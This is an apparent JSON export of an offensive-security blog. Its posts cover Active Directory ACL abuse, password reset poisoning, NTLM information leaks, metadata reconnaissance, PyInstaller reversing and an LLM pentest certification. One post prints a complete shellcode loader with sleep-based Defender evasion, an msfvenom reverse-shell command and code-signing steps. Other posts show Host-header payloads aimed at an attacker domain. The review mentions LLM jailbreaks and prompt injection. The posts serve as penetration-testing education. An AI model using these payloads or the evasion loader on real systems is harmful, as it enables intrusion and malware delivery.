[ { "title": "Certified AI/ML Pentester Review", "url": "/blog/certified-ai-ml-pentester/", "categories": "Education", "tags": "AI/ML", "date": "2024-10-28 00:00:00 -0400", "snippet": "As organizations race to adopt the latest in artificial intelligence (AI), I was looking for training that addressed its unique attack surface and tested my skills in exploiting large language mode...", "content": "As organizations race to adopt the latest in artificial intelligence (AI), I was looking for training that addressed its unique attack surface and tested my skills in exploiting large language models (LLM). That‚Äôs when I discovered The SecOps Group and their Certified AI/ML Pentester, which was one of the first certifications (I‚Äôve seen*) to offer a practical exam on LLM exploitation.This post outlines my experience passing the C-AI/MLPen and provides helpful resources used to navigate The SecOps Group‚Äôs new ‚Äúexam-only‚Äù training model.PreparationInitially, I was thrown by The SecOps Group‚Äôs new exam-only approach, removing formal training and requiring 100% self-study ‚Äî especially when navigating a complex topic like LLM exploitation. However, the Exam Syllabus listed each topic covered, along with links to resources from industry leaders in AI such as Microsoft, Nvidia, and IBM.I spent a significant amount of time brushing up on advanced exploitation techniques such as direct/indirect prompt injection, training data manipulation, RAG poisoning, and vulnerabilities in LLM design. Most of my effort, however, were focused on practical challenges using platforms like Gandalf, Immersive Labs, and Crucible.Through each CTF challenge, I concentrated on ‚Äúwhy‚Äù rather than ‚Äúhow‚Äù; evaluating the models core functionality and identifying preventative controls such as output generation rules or input/output filters. I equated this to ‚Äúreconnaissance‚Äù in a standard pentest methodology before moving onto ‚Äúexploitation‚Äù. This made it much easier to craft jailbreaks, exploit excessive functionality, and extract sensitive information once I knew the extent of the LLMs current instructions.I finished studying with SecOps Mock Exam, which contained two challenges and used the same format as the real exam. Anyone looking for a good challenge should checkout level 2, which introduced a chatbot named Ultron communicating only in emojis and prone to hallucinations! üåçüíÄü¶†The ExamOverall the exam was super straightforward. Students are given 4 hours to work through 8 different AI models and extract a secret key. Submit these keys in the exam portal and click submit when done‚Ä¶ no reporting, notes, or other documentation requirements.Each AI model in the exam has a specific point allocation and students are required to get 60% or higher to pass ‚Äî meaning you should be safe with at least 6/8 challenges but pay attention!!ConclusionOverall, I had a great experience with the C-AI/MLPen and would recommend it for anyone looking to expand their knowledge in AI/ML security. It was a great intermediate level primer and I‚Äôm excited to see other trainings on the subject. Full disclosure - The SecOps Group provided me with an exam attempt to review the course. However, my experience was largely positive and I would recommend it regardless! The C-AI/MLPen provided a lot of fun challenges and, with ongoing discounts, can be found for only ~$65!" }, { "title": "Active Directory ACL Abuse with Kali Linux", "url": "/blog/acl-abuse-with-kali/", "categories": "Windows", "tags": "active directory", "date": "2024-05-08 00:00:00 -0400", "snippet": "Active Directory Access Control Lists (ACL), and their associated Access Control Entries (ACE), define the entities and permissions of a specific AD object. If misconfigured, abusing these permissi...", "content": "Active Directory Access Control Lists (ACL), and their associated Access Control Entries (ACE), define the entities and permissions of a specific AD object. If misconfigured, abusing these permissions can be an easy way of escalating privileges within an organization.OverviewMany of the articles and guides demonstrating Active Directory ACL abuse showcase exploitation from a Windows host. For good reason, PowerShell makes modification of vulnerable objects simple - especially when already connected to the domain.However, what happens when a vulnerable object is identified and operators are confined to a Linux operating system? Thanks to BloodHound.py, this situation is becoming more common during penetration tests where only network level access is granted or otherwise attained.This article provides a brief walk through on enumerating and exploiting ‚ÄúGenericAll‚Äù permissions against a vulnerable user object to successfully escalate privileges within Active Directory.EnumerationAs briefly mentioned, BloodHound.py is an ingestor for BloodHound created by dirkjanm. It makes use of the Impacket library to interact with and enumerate Active Directory environments.Given Active Directorys authentication requirements to retrieve object data, testers must already have a set of credentials.The following demonstrates enumeration of the demo.local domain from a Kali Linux host. This is being executed as the low-privileged, domain user demo\\user01:bloodhound-python -u user01 -p Password1! -d demo.local -c Acl -dc dc01.demo.local -ns 192.168.1.114Identifying GenericAllAfter running BloodHound.py, which installs as bloodhound-python, the resulting .json reports can be loaded into BloodHounds Neo4j database to map the results.This is where things get interesting‚Ä¶When examining our compromised user demo\\user01, the ‚ÄúOutbound Object Control‚Äù section exposed ‚ÄúGenericalAll‚Äù permissions over the demo\\service01 account.GenericAll implies we have full rights over the demo\\service01 user object, which also happens to be a member of the privileged demo\\Domain Admins group üòà.ExploitationTo exploit this position, we can leverage our demo\\user01 account to reset the password of demo\\service01 and escalate privileges to Domain Admin!While several Linux utilities exist to reset the current users password, I struggled to find a tool that could reset passwords on behalf of another account.This is when I came across PShlyundins ldap_shell, a fork of Fortras project but designed to execute as a stand-alone program - outside of ntlmrelayx.As demonstrated below, I leveraged the ldap_shell to initiate a shell on the domain controller over the LDAP protocol as demo\\user01. Then abused our allotted permissions to reset the password of demo\\service01 via the change_password command:These changes were confirmed with CrackMapExec to validate administrator privileges on the demo.local domain!After-Action ReviewI wrote this post after encountering ALC abuse in a real-world scenario, and held onto it for a bit (likely too long). Whether it be time passed or the freedom of proper research, I have since found additional methods of forcing password resets on alternate accounts from a Linux host.For example, thehacker.recipes provides an entire section on DACL abuse and demonstrates exploitation using the Samba suites built-in net utility via net rpc password.That said, the ability to open an LDAP shell outside of ntlmrelayx is still a good technique to have in your arsenal and provides more functionality than password resets to explore!" }, { "title": "Game Hacking: Hex Editing Save Files for Unlimited Cash", "url": "/blog/hex-editing-save-files/", "categories": "Linux", "tags": "reverse engineering", "date": "2023-08-10 00:00:00 -0400", "snippet": "After creating a Batocera live USB for retro gaming, I instantly started down the path of game hacking and researching how ROM‚Äôs (digital game copies) could be abused‚Ä¶This post serves as my introdu...", "content": "After creating a Batocera live USB for retro gaming, I instantly started down the path of game hacking and researching how ROM‚Äôs (digital game copies) could be abused‚Ä¶This post serves as my introduction to video game hacking through analyzing two saved states of Pokemon Red and hex editing targeted values for unlimited cash!Getting Setup (Level 1)To start, I created a fresh Ubuntu virtual machine and downloaded the GameBoy Emulator BGB ‚Äî executed using Wine. I tested a few emulators before settling on BGB for its built-in debugging capabilities.Next, I started the target ROM and created a new game.Before entering the first mandatory battle scene, I saved the game with $3,000 and made a copy of the .sav file located in the current directory:After creating a copy of the initial save state, I went back into the game and completed the first battle scene changing my cash value to $3,175. Having all the required pieces in place, I saved the game one last time and closed the emulator.Finding the Offset (Level 2)Using the two .sav files, I used the hexdump and diff commands to identify differences between the files. With each file being exactly alike, the cash values 3000 vs 3175 should stand out.The goal was to identify the offset, or location, of our player‚Äôs money in the saved state file. Once found, we can modify the value and restart the game with unlimited cash!Using Bulbapedia, I looked up the saved data structures in Pokemon Generation 1 games and found that money is stored in the save file as a Binary Coded Decimal. This meant, it is always interpreted as decimal even if viewed as hexadecimal.Therefore, we can identify the money offset by finding the location at which 30 00 is stored in file 1 and 31 75 is stored in file 2.Note: saved data structures may not always be as straight forward in alternate variables or game files.Changing the Save File (Level 3)Now that the offset of our players cash was found at 0x25F3 we can visit this value in our active file and replace it with 9999:At this point, I was excited to resume the game and see the new cash amount under my player‚Äôs profile. However, instead, the game indicated the save state was corrupt or destroyed ‚ò†Ô∏èDefeating the Checksum (Boss Battle)Researching the error a bit more, it turns out a checksum value is placed in each save file at 0x3523. This is a one byte field, with 256 possible values, used to protect the integrity of the game data.Luckily, the checksum implementation was very well documented. This made it possible to replicate with the following Python code, and write the correct checksum byte to our save file:import syswith open(sys.argv[1], 'rb+') as f: sav = bytearray(f.read()) checksum = 0xff for c in sav[0x2598:0x3523]: checksum -= c sav[0x3523]=checksum&amp;0xff f.seek(0,0) f.write(sav) print(\"Checksum value updated: {}\".format(checksum&amp;0xff))Now, when restarting the game, I was allowed to resume at the last saved position with the maximum money value allowed ü§ëConclusionPokemon Red‚Äôs ‚Äúmoney‚Äù value was a good proof-of-concept and introduction to game hacking. While variations may exist between alternate games and consoles, the overall technique of hex editing save files can be applied universally." }, { "title": "Decoding the Airwaves: Tracking Device Movements With WiFi", "url": "/blog/device-tracking-with-wifi/", "categories": "Wireless", "tags": "privacy", "date": "2023-06-30 00:00:00 -0400", "snippet": "One of the many rabbit holes Ive gone down recently was the use of WiFi to track client devices. While this technique is not new by any means, I recall seeing matt0177s 2022 Blackhat USA talk where...", "content": "One of the many rabbit holes Ive gone down recently was the use of WiFi to track client devices. While this technique is not new by any means, I recall seeing matt0177s 2022 Blackhat USA talk where he demonstrated using signal intelligence emitted from personal devices as a means of counter surveillance. This was the first practical application of device tracking I was exposed to and wanted to try taking this one step further for home use üì∂.My goal was to capture local wireless signals and create a secondary data point for alerts triggered by motion cameras and other home alarms. Best case scenario, this could provide information about the unwanted visitors device (aka smartphone) such as: Unique MAC address for device tracking. Device manufacturer using OUI lookups. Recently connected access points via ESSID probes.How Does this Work?The concept behind this is actually quite simple‚Ä¶Many of our smartphones and mobile devices are set up perfectly for convenience. They unconsciously join our home networks, connect to our cars bluetooth automatically, and pickup our wireless headphones every-time.That said, how many people turn off their WiFi or disable bluetooth when leaving the house?Because of this, our phones are always emitting signals looking for known devices/networks. These wireless beacons can be intercepted and interpreted by anyone listening.Hardware RequirementsFor this project I used the following hardware: Raspberry Pi 4b Alfa Dual-Band wireless adapterDetecting Nearby DevicesI was hoping to modify an existing open source project or make use of the amazing Kismet toolset for proof-of-concept. However, for several reasons, I ended up creating a custom app called SignalSpy.SignalSpy uses the aircrack-ng suite to monitor nearby devices and display the data in a neatly formatted web application. This information can be used to track signals in range, view connected devices of neighboring access points, and calculate approximate distance based on signal strength.Custom NotificationsTo make detection easier, device alerts can be configured based on mac address, distance, power, and occurrence ‚Äî with optional Slack push notifications:Success! üèÜIt took a few days to get the scan durations and alerts configured for my environment. Many of my initial issues were caused by the placement of the Raspberry Pi in relation to the areas I was trying to monitor.In the end, I managed to successfully align the SignalSpy alerts with other security appliances. This was tested extensively with both my own devices and a few unplanned participants ‚Äî thank you Amazon delivery:Even in cases where smartphones utilized Private WiFi for MAC address rotation, it was possible to extract access point names, or ESSID values, from client probe requests. This could allow unique names to be searched on sites such as WiGLE to identify known locations and presumably the owners home address.ConclusionOverall, the amount of data received from monitoring wireless frequencies was overwhelming ‚Äî even in a somewhat rural setting. However, through normalizing and sorting this information, it was possible to successfully track device movements!Pairing this data with other controls such as home security cameras, provided an easy way to get additional information on triggered events:Dev NotesSo far, only 2.4GHz and 5GHz wireless frequencies were experimented. Incorporating additional short-range signals such as Bluetooth could provide alternate data points and increase accuracy of device tracking.For those still wondering ‚Äúwhy not Kismet?‚Äù: I had concerns about the size of the database when trying to create a semi-permanent home solution running for extended periods of time. I spent time playing with kismet_logging.conf to reduce size and tried restarting the program to initiate a new .kismet database. However, I could never get the file size small enough and ran into wireless card issues when constantly resetting the Kismet daemon. Lastly, and most importantly, I ran out of time. If I continue development with SignalSpy, I want to dig into this more for Kismets awesome data collection and default compatibility with Bluetooth, GPS, and more!" }, { "title": "Portable Python for In-Memory Execution & Modern Evasion", "url": "/blog/portable-python/", "categories": "Windows", "tags": "evasion", "date": "2022-12-22 00:00:00 -0500", "snippet": "Forget compiling payloads and operating on disk ‚Äî this post demonstrates the use of Python‚Äôs portable interpreter for in-memory malware deployment, even when the language isnt installed on the host...", "content": "Forget compiling payloads and operating on disk ‚Äî this post demonstrates the use of Python‚Äôs portable interpreter for in-memory malware deployment, even when the language isnt installed on the host.Why Python?Python is a well known language with an infinite number of legitimate uses inside an organization. Through the use of Python‚Äôs portable, or embedded package we can download a single .zip file and gain access to the python.exe interpreter without any installation required by the user.Additionally, python.exe is a signed binary with a high reputation score, making it unlikely to be blocked. This provides a perfect vehicle for execution of a C2 beacon, or other payload, while on offensive security engagements.Proof of ConceptThe following video demonstrates PowerShell being used to download and extract a portable Python interpreter. Once on disk, a download cradle is used to retrieve the payload and execute a meterpreter shell in memory ‚Äî bypassing the latest version of Windows Defender and other endpoint security solutions: Payload source, PowerShell commands, and Python download cradle are available at github.com/m8sec/OffsecDevAdditional ResourcesFor more information on this technique, and potential areas of detection, checkout Diago Capriottis Pyramid project or his DefCon Adversary Village talk: Python vs Modern Defenses!" }, { "title": "Pythonic Malware Part-2: Reversing Python Executables", "url": "/blog/pythonic-malware-pt2/", "categories": "Windows", "tags": "reverse engineering", "date": "2022-04-22 00:00:00 -0400", "snippet": "Post Updates 09/2023: Starting in PyInstaller 6, bytecode encryption and the --key argument have been depreciated.OverviewIn Pythonic Malware Part-1, I demonstrated how Python executables can be u...", "content": "Post Updates 09/2023: Starting in PyInstaller 6, bytecode encryption and the --key argument have been depreciated.OverviewIn Pythonic Malware Part-1, I demonstrated how Python executables can be used to bypass Windows Defender and successfully launch Meterpreter shells on a fully patched system. However, this raised an interesting question, why don‚Äôt more APT‚Äôs and threat groups use Python for malware development?While highly effective, one reason is because compiled Python is easily reversed. Without manual intervention or converting to lower-level languages, the default ways of compiling Python could allow blue teams to recover the clear-text source.This post demonstrates how to decompile the shellcode_loader.exe file created in Part-1 and recover the source code being executed ‚Äî even when employing PyInstaller‚Äôs bytecode obfuscation with AES256 encryption.Decompiling Python Executables1. Unpacking the ExecutableThe first step in decompiling the shellcode_loader.exe file is to unpack the compiled binary using pyinstxtractor. This will create a new directory containing the original Python bytecode files and packaged resources:&gt;&gt; python pyinstxtractor.py shellcode_loader.exe[+] Processing shellcode_loader.exe[+] Pyinstaller version: 2.1+[+] Python version: 307...[+] Possible entry point: shellcode_loader.pyc[+] Found 179 files in PYZ archive[+] Successfully extracted pyinstaller archive: shellcode_loader.exeExtracted files located in the newly created ‚Äúshellcode_loader.exe_extracted‚Äù directory.2. Converting Python BytecodeNow that we have the bytecode (.pyc) version of our source, we can use uncompyle6 to convert our shellcode_loader.pyc back to human readable code:Converting .pyc files back to .py with uncompyle6.Defeating PyInstaller‚Äôs AES256 EncryptionAfter successfully reversing the shellcode loader script, I wanted to dig deeper and explore PyInstaller‚Äôs bytecode obfuscation with AES encryption. This can be implemented by adding the --key argument during compilation, as shown below:pyinstaller -F --key MySecretKey12345 shellcode_loader.pyMethod 1: Unencrypted SourceWhen going back and unpacking the newly created executable, several errors were displayed that indicated encryption may be applied:Unpacking the encrypted executable with pyinstxtractor.However, it was still possible to convert the shellcode_loader.pyc file back to its original source ‚Äî without any decryption methods applied:Code snippet from original shellcode_loader.py fileReviewing the terminal messages and unpacked files, it appeared only resource files were encrypted and placed in the PYZ-00.pyz_extracted directory. This means the scripts entry-point and primary file was NOT protected.Method 2: Using the Decryption KeyGiven only script resources are encrypted, I restructured the shellcode loader script to import the primary code as a resource. The final directory structure looked something like:|_shellcode_loader.py (entrypoint)|_scloader |_ __init__.py (malicious code)Once recompiling and unpacking, the same encryption error messages were shown. However, this time, I was unable to recover the source:That‚Äôs when I found the pyimod00_crypto_key.pyc file in the unpacked directory, which contained the static key used to decrypt the executable at runtime:PyInstallers encryption key found in clear-text at ‚Äúpyimod00_crypto_key.pyc‚Äù.Using the script below, this key can be leveraged to decrypt the Python bytecode and recover the original file before using uncompyle6:#!/usr/bin/env python3# Author: @m8sec# Description: Decrypt AES encrypted bytecode files by pyinstaller.import osimport sysimport zlibimport tinyaeskey = sys.argv[1] # Pyinstaller encryption Keyencrypt_file = sys.argv[2] # Encrypted file pathstruct_file = sys.argv[3] # Path to *exe_extracted\\struct.pycdecrypt_file = \"decrypted.pyc\" # .pyc output fileCRYPT_BLOCK_SIZE = 16# Grab pyc headers from packaged struct.pyc filewith open(os.path.join(struct_file), 'rb') as head: pyc_header = head.read()[:16]# Decrypt file and decompresswith open(encrypt_file, 'rb') as d: data = d.read() cipher = tinyaes.AES(key.encode(), data[:CRYPT_BLOCK_SIZE]) decrypt = cipher.CTR_xcrypt_buffer(data[CRYPT_BLOCK_SIZE:]) plaintext = zlib.decompress(decrypt) # Write to file a = open(decrypt_file, 'wb') a.write(pyc_header) a.write(plaintext) a.close()ConclusionReversing Python executables without additional protection mechanisms can be trivial. In fact, PyInstaller‚Äôs documentation even mentions their AES256 encryption only prevents ‚Äúcasual‚Äù tampering. This is just one reason Python malware is not more common in modern enterprise environments." }, { "title": "Pythonic Malware: Evading Detection with Compiled Executables", "url": "/blog/pythonic-malware/", "categories": "Windows", "tags": "evasion", "date": "2022-04-11 00:00:00 -0400", "snippet": "Creating Python executables during an offensive security engagement used to be an effective method of evasion. However, this tactic has become increasingly difficult on modern Windows endpoints.In ...", "content": "Creating Python executables during an offensive security engagement used to be an effective method of evasion. However, this tactic has become increasingly difficult on modern Windows endpoints.In fact, even benign programs seem to get blocked immediately after touching disk. This is just one of the reasons red teamers have moved away from popular frameworks such as Veil-Evasion and onto bigger-better things.This post revisits compiled Pythons use in offensive security testing and shares my experiences launching Meterpreter shells on a fully patched Windows 10 system against Windows Defender.Malware CreationGiven my primary focus was on evasion tactics in the compiled executable, I created a simple shellcode loader as my ‚Äúmalware‚Äù. The script called common Windows functions such as VirtualAlloc &amp; CreateThread to inject shellcode locally within the current process.The payload itself utilized a reverse_https connection over port 443 and was generated by MSFVenom, without any encoding or obfuscation techniques:msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.1.157 LPORT=443 -f pyAt this point, I didnt have much faith in the code and thought it was sure to get detected. However, when attempting to execute the Python script directly, no alerts were triggered and a reverse connection was established.Compiling PythonDespite triggering a successful Meterpreter shell, we cant rely on Python being installed on every Windows workstation. Therefore, the next step is to compile the source code ‚Äî making it executable without needing any additional resources on the host.Compiling Python is performed using tools like pyinstaller, py2exe, or cx_freeze. These work by wrapping the bytecode version (.pyc) of the script and all required dependencies/interpreters into a single .exe file:pyinstaller --onefile .\\shellcode_loader.pyUnfortunately, when downloading the newly compiled shellcode_loader.exe onto the target system, I didnt get very far before receiving the following alert:Evading DetectionCode SigningAt this point, I thought about potential strategies to avoid detection and looked into signing the executable with a self-signed certificate.Using the Visual Studio Developer Command Prompt, I executed the following commands to generate a certificate and sign the shellcode_loader.exe file.&gt;&gt; makecert /r /h 0 /eku \"1.3.6.1.5.5.7.3.3,1.3.6.1.4.1.311.10.3.13\" /e 12/12/2025 /sv m8.pvk m8.cer&gt;&gt; pvk2pfx /pvk m8.pvk /spc m8.cer /pfx m8.pfx&gt;&gt; signtool sign /a /fd SHA256 /f m8.pfx shellcode_loader.exeNow, looking at the files properties, ‚ÄúJoes-Software-Emporium‚Äù was listed under Digital Signature details‚Äî (Microsoft Default). With that, the executable could be downloaded without detection.Sleep IntervalsAlthough I was able to download the file, Windows Defender still flagged the program when attempting execution. Thats when I remembered reading F-Secures post about evading Windows Defender Runtime Scanning, which provided lots of great takeaways.In short, I found adding various sleep intervals between the Win32 API calls bypassed runtime scanning and successfully triggered a working reverse shell.ConclusionA compiled Python executable wouldnt be my first choice in a true red teaming engagement. However, this was a fun proof-of-concept and may prove useful in other areas of offensive security testing.Source Code:A final copy of my shellcode_loader.py script is available below:import sysimport ctypesimport hashlibfrom time import sleepimport ctypes.wintypes as wtfrom base64 import b64decodefrom Crypto.Cipher import AESfrom Crypto.Util.Padding import paddef DecryptXOR(data, key): # Optional xor decryption method (not in use) data = bytearray(b64decode(data)) l = len(key) keyAsInt = [x for x in map(ord, key)] return bytes(bytearray(((data[i] ^ keyAsInt[i % l]) for i in range(0,len(data)))))def DecryptAES(data, key): # Optional AES decryption method (not in use) data = bytearray(b64decode(data)) key = bytearray(b64decode(key)) iv = 16 * b'\\x00' cipher = AES.new(hashlib.sha256(key).digest(), AES.MODE_CBC, iv) return cipher.decrypt(pad(data, AES.block_size))# msfvenom -p windows/x64/meterpreter/reverse_http lhost=0.0.0.0 lport=443 -f pybuf = b\"\"try: # Function definitions kernel32 = ctypes.windll.kernel32 kernel32.VirtualAlloc.argtypes = (wt.LPVOID, ctypes.c_size_t, wt.DWORD, wt.DWORD) kernel32.VirtualAlloc.restype = wt.LPVOID kernel32.CreateRemoteThread.argtypes = (wt.HANDLE, wt.LPVOID, ctypes.c_size_t, wt.LPVOID, wt.LPVOID, wt.DWORD, wt.LPVOID) kernel32.CreateThread.restype = wt.HANDLE kernel32.RtlMoveMemory.argtypes = (wt.LPVOID, wt.LPVOID, ctypes.c_size_t) kernel32.RtlMoveMemory.restype = wt.LPVOID kernel32.WaitForSingleObject.argtypes = (wt.HANDLE, wt.DWORD) kernel32.WaitForSingleObject.restype = wt.DWORD # Start Shellcode loader print(\"[+] Starting shellcode loader:\") memAddr = kernel32.VirtualAlloc(None, len(buf), 0x3000, 0x40) print('[*] Allocated memory space at: {:08X}'.format(memAddr)) print('[*] Interval sleep to avoid runtime detection (1/2).') sleep(5) kernel32.RtlMoveMemory(memAddr, buf, len(buf)) print('[*] Copied payload into memory.') print('[*] Interval sleep to avoid runtime detection (2/2).') sleep(5) th = kernel32.CreateThread( ctypes.c_int(0), ctypes.c_int(0), ctypes.c_void_p(memAddr), ctypes.c_int(0), ctypes.c_int(0), ctypes.pointer(ctypes.c_int(0)) ) print('[*] Created thread in current process.') kernel32.WaitForSingleObject(th, -1)except KeyboardInterrupt: print(\"[!] Key detected, closing\") sys.exit(1)except Exception as e: print(\"[-] Error: {}\".format(str(e))) sys.exit(0)" }, { "title": "Exploiting Password Reset Poisoning", "url": "/blog/password-reset-poisoning/", "categories": "Web Security", "tags": "exploit", "date": "2021-11-13 00:00:00 -0500", "snippet": "To date, one of my most lucrative bug bounties came from a password reset poisoning vulnerability. This post walks through the process of finding, exploiting, and fixing this bug to help you earn a...", "content": "To date, one of my most lucrative bug bounties came from a password reset poisoning vulnerability. This post walks through the process of finding, exploiting, and fixing this bug to help you earn a max payout in your own disclosures!OverviewPassword reset poisoning is a header based attack, where an attacker can manipulate the URL of a password reset link. Through adding or modifying HTTP request header values during an applications password reset process, it may be possible to overwrite the domain of the link sent to the user:Hi,Click the link below to reset your password:https://&lt;attacker-domain&gt;/reset?token=123456789Once clicked, the reset token is relayed to an attacker-controlled domain ‚Äî resulting in account takeover.Exploitation Navigate to the web applications ‚ÄúPassword Reset‚Äù page. Enter the name, username, or email of the target users account. Use a web application proxy (BurpSuite, OWASP-ZAP, etc) to intercept the request and modify the Host: header value to an attacker controlled address: Dont have your own server? Burp Collaborator links can help! POST /login/password-reset HTTP/1.1Host: &lt;attacker-domain&gt;...{\"email\":\"target-user@company.com\"} The user will receive a legitimate password reset email from the site. However, the link containing the secret reset token will show our modified header value: https://&lt;attacker-domain&gt;/reset?token=123456789 Once clicked by the user, the attacker can intercept the token and replay its value on the target application to successfully reset the victims password for full account takeover!Workflow created by PortSwiggerAdvanced ExploitationHost header not working? Try these techniquesDouble Host HeaderDepending on how the server reacts to duplicate Host headers in the HTTP request, the malicious input may take precedence over the default:POST /login/password-reset HTTP/1.1Host: example.comHost: &lt;attacker-domain&gt;...Test Override HeadersOverride headers such as X-Forwarded-Host, X-Forwarded-Server, X-HTTP-Host-Override, and X-Host can sometimes work to replace the Host header value‚Äî resulting in successful exploitation:POST /login/password-reset HTTP/1.1Host: example.comX-Forwarded-Host: &lt;attacker-domain&gt;...RemediationWhy does this happen?Password reset poisoning can occur when a website relies on header values to direct traffic or craft page links. If left unchecked, an attacker can inject their own values and modify the intended behavior of the application.How to fix it?The easiest approach, is avoid using header values to define site navigation. Request headers are not protected fields and can be modified by the user to inject malicious inputs. Additionally, performing Host header validation and removing support for override headers such as X-Forwarded-Host can be good mitigating strategies.For more prevention methods, checkout the Preventing HTTP Host header attacks section of this article.Practice ResourcesWant to try this technique on your own? Checkout: PortSwigger Lab: Basic Password Reset Poisoning. PortSwigger Lab: Password Reset Poisoning via Middleware. PortSwigger Lab: Password Reset Poisoning via Dangling Markup." }, { "title": "Hacking Organizations One Document at a Time With Metadata", "url": "/blog/hacking-with-metadata/", "categories": "Web Security", "tags": "recon", "date": "2021-02-03 00:00:00 -0500", "snippet": "Metadata is simply defined as data about data. In computer systems, this is used to correctly interpret files and store descriptive attributes. While not always visible, metadata provides far more ...", "content": "Metadata is simply defined as data about data. In computer systems, this is used to correctly interpret files and store descriptive attributes. While not always visible, metadata provides far more information than content creators realize. Once a document and containing metadata is made public, it could unknowingly help an attacker infiltrate your organization.As a penetration tester, I am often given a week to target a clients public facing environment with the goal of breaching their internal network. This form of testing allows the client to evaluate the effectiveness of their defensive solutions, assess the security teams response to simulated threat activity, and identify vulnerabilities for remediation. However, with only one week and zero preexisting knowledge, this can be a daunting task.In comes metadata!The first step in penetration testing, or any offensive security engagement, is reconnaissance. Learning how your target operates. This includes everything from the software they use to their user account naming convention. All of which can be leveraged in subsequent attacks.Metadata is a go-to source for this information and is easily overlooked during a companys publishing process. Once posted on their website, or another public forum, it is possible to download the file and extract critical information using utilities such as Phil Harveys ExifTool. This is a platform-independent application written in Perl that can be used to read, write, and edit meta information in a variety of file types.Image depicting the types of information that can be extracted from metadata.AutomationThis process can be simplified even further with tools such as PyMeta, which uses search engine scraping to automatically find public documents released by an organization. Once found, it will download the files and create a neatly formatted report of the extracted metadata.Partial PyMeta report from a popular domain-wide bug bounty program.Information such as user account naming conventions can be applied to generate a list of users for brute-forcing or social engineering style attacks. This data can also be used to make inferences about the environment or craft custom payloads based on the operating system(s), software, or application versions found.What can we do about this?Metadata can be removed in Microsoft Office through modifying the document properties and enabling personal information removal in the privacy settings.Depending on the technologies employed by an organization, third party tools or plugins may exist to strip metadata during the upload process. Otherwise, this removal can also be done at the operating system level via File Explorer.Wrapping it upUsing metadata to target organizations has been around for years. However, it remains an unrealized point of information for defenders that is still heavily leveraged by attackers today." }, { "title": "Information Disclosure in NTLM Authentication", "url": "/blog/ntlm-info/", "categories": "Windows", "tags": "recon", "date": "2020-03-05 00:00:00 -0500", "snippet": "This post introduces the concept of information disclosure through NTLM authentication and demonstrates methods for invoking an NTLM challenge response over HTTP(S) - even when no login page is pre...", "content": "This post introduces the concept of information disclosure through NTLM authentication and demonstrates methods for invoking an NTLM challenge response over HTTP(S) - even when no login page is present.OverviewNTLM authenticates users via a challenge/response sequence in which the users actual password is never sent over the wire. Instead, the requesting client receives a challenge from the server and must perform a calculation that proves their identity.I am far over simplifying this process, but the diagram below is a good example of how this authentication scheme works in a Windows AD environment.Now, how does this help in recovering sensitive internal information?Once a target is identified as using NTLM authentication, we can initiate a connection and send anonymous (null) credentials, which will prompt the server to respond with an NTLM Type 2 challenge response.This response message can be decoded to reveal information about the server, such as: NetBIOS, DNS, and OS build version information:Target_Name: DEMONetBIOS_Domain_Name: DEMONetBIOS_Computer_Name: SRV01DNS_Domain_Name: demo.localDNS_Computer_Name: srv01.demo.localDNS_Tree_Name: demo.localProduct_Version: 6.3.9600ImpactDuring a penetration test this can be used to identify internal naming conventions, determine end-of-life operating systems, and discover internal DNS names.To describe one potential use-case for this data, the domain suffix, found in the decoded response, can aid in password spraying attacks against an organizations Outlook Web Application (OWA). Targeting OWA is a common technique used by hackers to identify valid domain credentials and could lead to further attacks.Although not the most prestigious vulnerability, if found against a bug bounty target, you may be able to leverage this internal disclosure for a few quick points:Exploitation in HTTP(S)Typically, when visiting a website or directory requiring privileged access, the server will initiate a login prompt. This allows the client to send blank username/password values to check for NTLM authentication and receive the encoded response.However, if the target is configured to allow Windows authentication, it may be possible to invoke this response without a login prompt. This can be done by adding the following line to the HTTP request headers:Authorization: NTLM TlRMTVNTUAABAAAAB4IIAAAAAAAAAAAAAAAAAAAAAAA=Once an NTLM challenge is returned through the WWW-Authenticate response header, it can be decoded to capture internal information. I personally use Burps NTLM Challenge Decoder, but multiple other scripts have been written that can perform these actions.Alternate ProtocolsFew may know the trick of adding the Authorization header to prompt a response from the server over HTTP(S), but this exposure can be found in alternate protocols as well.Using Telnet we can interact with other services, outside the browser, to force an NTLM challenge response and achieve this same information exposure.SMTProot@kali: telnet example.com 587220 example.com SMTP Server Banner&gt;&gt; HELO250 example.com Hello [x.x.x.x]&gt;&gt; AUTH NTLM334 NTLM supported&gt;&gt; TlRMTVNTUAABAAAAB4IIAAAAAAAAAAAAAAAAAAAAAAA=334 TlRMTVNTUAACAAAACgAKADgAAAAFgooCBqqVKFrKPCMAAAAAAAAAAEgASABCAAAABgOAJQAAAA9JAEkAUwAwADEAAgAKAEkASQBTADAAMQABAAoASQBJAFMAMAAxAAQACgBJAEkAUwAwADEAAwAKAEkASQBTADAAMQAHAAgAHwMI0VPy1QEAAAAAIMAProot@kali: telnet example.com 143* OK The Microsoft Exchange IMAP4 service is ready.&gt;&gt; a1 AUTHENTICATE NTLM+&gt;&gt; TlRMTVNTUAABAAAAB4IIAAAAAAAAAAAAAAAAAAAAAAA=+ TlRMTVNTUAACAAAACgAKADgAAAAFgooCBqqVKFrKPCMAAAAAAAAAAEgASABCAAAABgOAJQAAAA9JAEkAUwAwADEAAgAKAEkASQBTADAAMQABAAoASQBJAFMAMAAxAAQACgBJAEkAUwAwADEAAwAKAEkASQBTADAAMQAHAAgAHwMI0VPy1QEAAAAANmap ScriptingNTLM authentication can be found embedded in alternate application protocols such as: HTTP, SMTP, IMAP, POP3, RDP, MS-SQL, NNTP, and TELNET. As such, they may also be susceptible to this type of disclosure on offensive security engagements.To help automate the search, NMAP has several built-in NSE scripts to easily find this vulnerability:http-ntlm-info.nseimap-ntlm-info.nsems-sql-ntlm-info.nsenntp-ntlm-info.nsepop3-ntlm-info.nserdp-ntlm-info.nsesmtp-ntlm-info.nsetelnet-ntlm-info.nseThrough the --script=*-ntlm-info argument we can apply all checks against a given host, which will prioritize execution based on open ports identified:root@kali: nmap -sS -v --script=*-ntlm-info --script-timeout=60s example.comNmap scan report for x.x.x.xHost is up (0.0063s latency).Not shown: 998 filtered portsPORT STATE SERVICE80/tcp open http| http-ntlm-info:| Target_Name: IIS01| NetBIOS_Domain_Name: IIS01| NetBIOS_Computer_Name: IIS01| DNS_Domain_Name: IIS01| DNS_Computer_Name: IIS01|_ Product_Version: 6.3.9600Defensive MeasuresThe recommended remediation for this vulnerability is to disable NTLM authentication over HTTP in the IIS Manager. Restricting public access to the ports utilizing Windows authentication is another approach to containing the exposure and will help to prevent brute-force attacks against the service.References and Additional Resources: http://davenport.sourceforge.net/ntlm.html 